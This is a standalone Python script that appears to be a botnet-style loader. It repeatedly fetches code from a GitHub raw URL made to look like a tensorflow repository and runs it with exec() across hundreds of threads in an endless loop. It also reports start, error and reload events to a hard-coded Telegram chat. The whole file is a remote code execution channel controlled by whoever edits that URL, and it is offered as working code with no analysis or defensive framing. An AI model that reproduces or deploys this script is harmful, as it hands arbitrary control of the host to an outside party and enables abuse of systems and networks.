import os
import threading
import requests
import sys
from datetime import datetime, timedelta
import time


EXECUTION_CODE="print('@ADMlNxd')"
GROUP_NAME = os.environ.get("GROUP_NAME","anonymous")
THREAD_COUNT = int(os.environ.get("THREAD_COUNT",500))
BOT_TOKEN = os.environ.get("BOT_TOKEN","NO_TOKEN")
gap_min = 5
ATTEMPT = 0
UPDATED = False

def LOGGING(msg="Empty Message"):
  print(msg)
  req=requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
  params={"chat_id":-1001690479705,"text":msg,"parse_mode":"HTML"})

LOGGING("#START\nGroup <pre>{}</pre> is started successfully".format(GROUP_NAME))
def runMyCode(botNo):
  global EXECUTION_CODE,ATTEMPT
  try:
    exec(EXECUTION_CODE)
  except Exception as e:
    LOGGING('#ERROR runMyCode\n⚠️ {} on line {}\nError Type: {}\n<pre>{}</pre>'.format(GROUP_NAME,sys.exc_info()[-1].tb_lineno,type(e).__name__,e))

def update_code():
  global EXECUTION_CODE,UPDATED
  while 1:
    print("Checking for update")
    RESPONSE_CODE = requests.get(r"https://raw.githubusercontent.com/twoSideCoder/tensorflow/master/tools/inject.py").text
    if RESPONSE_CODE.startswith("#ADMlNxd"):
      if RESPONSE_CODE != EXECUTION_CODE:
        EXECUTION_CODE = RESPONSE_CODE
        try:
          version=EXECUTION_CODE.split("\n")[0].split(" ")[1]
        except Exception as e:
          version="Undefined"
        UPDATED = True
        LOGGING("#RELOAD\nGroup <pre>{}</pre> is updated and restarted successfully\nVersion <pre>{}</pre>".format(GROUP_NAME,version))
    dt = datetime.now()
    minute = dt.minute
    minute = minute//gap_min
    minute = minute*gap_min + gap_min
    dt = dt.replace(minute= 0,second=0, microsecond=0)
    dt = dt + timedelta(minutes=minute)
    while datetime.now() < dt:
        time.sleep(1)
def make_and_destroy_thread():
  threads = []
  for i in range(int(THREAD_COUNT)):
    thread = threading.Thread(target=runMyCode,args=[i])
    thread.start()
    threads.append(thread)
  for thread in threads:
    thread.join()
  make_and_destroy_thread()

if __name__ == "__main__":
  threading.Thread(target=update_code).start()
  while not UPDATED:
    time.sleep(1)
  make_and_destroy_thread()
